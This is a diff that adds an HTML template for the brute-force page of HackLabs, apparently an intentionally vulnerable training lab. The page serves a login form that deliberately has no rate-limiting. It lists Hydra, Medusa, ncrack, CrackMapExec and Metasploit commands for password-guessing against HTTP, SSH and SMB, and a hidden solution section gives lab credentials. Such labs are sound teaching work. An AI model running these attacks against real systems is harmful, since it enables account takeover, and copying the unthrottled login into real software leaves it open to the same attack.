@@ -1,0 +1,148 @@
+{% extends "base.html" %}
+{% block title %}Bruteforce – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <!-- Tab navigation -->
+  <div class="flex items-center gap-2 mb-6 flex-wrap">
+    <button class="tab-pill active" onclick="switchTab('http', this)">
+      <i class="ph ph-globe text-sm"></i> HTTP Login
+    </button>
+    <button class="tab-pill" onclick="switchTab('ssh', this)">
+      <i class="ph ph-terminal-window text-sm"></i> SSH
+    </button>
+    <button class="tab-pill" onclick="switchTab('smb', this)">
+      <i class="ph ph-network text-sm"></i> SMB
+    </button>
+  </div>
+
+  <!-- ── HTTP Login Tab ── -->
+  <div id="tab-http" class="tab-pane active">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-4" style="color:var(--hl-primary)">Login sin rate-limiting</div>
+
+      {% with messages = get_flashed_messages(with_categories=true) %}
+        {% for cat, msg in messages %}
+          <div class="mb-4 {% if cat == 'success' %}alert-success{% else %}alert-error{% endif %}">{{ msg }}</div>
+        {% endfor %}
+      {% endwith %}
+
+      {% if bf_result %}
+        <div class="mb-4 {% if bf_success %}alert-success{% else %}alert-error{% endif %}">{{ bf_result }}</div>
+      {% endif %}
+
+      <form method="POST" action="/bruteforce/login" class="space-y-3">
+        <div>
+          <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">Username</label>
+          <input type="text" name="username" placeholder="admin" class="hl-input" autocomplete="off" />
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">Password</label>
+          <input type="password" name="password" placeholder="••••••••" class="hl-input" />
+        </div>
+        <button type="submit" class="btn-primary w-full justify-center">Login</button>
+      </form>
+    </div>
+
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3 text-gray-400">Herramientas / Tools</div>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># Hydra — brute force user admin</div>
+        <div>hydra -l admin -P /usr/share/wordlists/rockyou.txt \</div>
+        <div class="pl-4">localhost -s 5000 http-post-form \</div>
+        <div class="pl-4">"/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas"</div>
+        <div class="mt-2 text-gray-400"># Burp Suite Intruder</div>
+        <div class="text-gray-400"># POST /bruteforce/login → Intruder → Sniper → mark §password§</div>
+        <div class="text-gray-400"># Payloads: Simple list → rockyou.txt → Launch → sort by length</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── SSH Tab ── -->
+  <div id="tab-ssh" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">SSH Bruteforce</div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        Ataque de fuerza bruta contra el servicio SSH de la máquina objetivo.
+        No hay rate-limiting activo; la autenticación se gestiona por el servidor SSH del host.
+      </p>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># Hydra</div>
+        <div>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP</div>
+        <div>hydra -L users.txt -P rockyou.txt -t 4 ssh://TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Medusa</div>
+        <div>medusa -h TARGET_IP -u root -P rockyou.txt -M ssh</div>
+        <div class="mt-2 text-gray-400"># ncrack</div>
+        <div>ncrack -p 22 --user root -P rockyou.txt TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Metasploit</div>
+        <div>use auxiliary/scanner/ssh/ssh_login</div>
+        <div>set RHOSTS TARGET_IP; set PASS_FILE rockyou.txt; run</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── SMB Tab ── -->
+  <div id="tab-smb" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">SMB Bruteforce</div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        Ataque de fuerza bruta contra el servicio SMB/CIFS de la máquina objetivo (puerto 445).
+      </p>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># Hydra</div>
+        <div>hydra -l Administrator -P rockyou.txt smb://TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># CrackMapExec</div>
+        <div>crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</div>
+        <div>crackmapexec smb TARGET_IP -u users.txt -p passwords.txt --no-bruteforce</div>
+        <div class="mt-2 text-gray-400"># Metasploit</div>
+        <div>use auxiliary/scanner/smb/smb_login</div>
+        <div>set RHOSTS TARGET_IP</div>
+        <div>set SMBUser Administrator</div>
+        <div>set PASS_FILE /usr/share/wordlists/rockyou.txt</div>
+        <div>run</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Guía de uso</h3>
+    <ol>
+      <li>El endpoint <code>/bruteforce/login</code> no implementa rate-limiting ni bloqueo de cuenta.</li>
+      <li><strong>Hydra HTTP:</strong> Ajusta el mensaje de error (<code>Credenciales incorrectas</code>) al texto real de respuesta fallida.</li>
+      <li><strong>Burp Intruder:</strong> Usa Cluster Bomb para atacar usuario + contraseña simultáneamente.</li>
+      <li><strong>Wordlists recomendadas:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code></li>
+      <li><strong>Credenciales conocidas:</strong> admin/admin123, alice/password, bob/123456, charlie/qwerty, dave/letmein</li>
+      <li>Para SSH/SMB, reemplaza <code>TARGET_IP</code> por la IP de la máquina objetivo.</li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Usage Guide</h3>
+    <ol>
+      <li>HackLabs' <code>/bruteforce/login</code> endpoint has no rate-limiting or account lockout.</li>
+      <li><strong>Hydra HTTP:</strong> Match the failure string (<code>Credenciales incorrectas</code>) to the actual failed response text.</li>
+      <li><strong>Burp Intruder:</strong> Use Cluster Bomb to attack username + password simultaneously.</li>
+      <li><strong>Recommended wordlists:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code></li>
+      <li><strong>Known credentials:</strong> admin/admin123, alice/password, bob/123456, charlie/qwerty, dave/letmein</li>
+      <li>For SSH/SMB, replace <code>TARGET_IP</code> with the target machine IP.</li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-pill').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+{% endblock %}
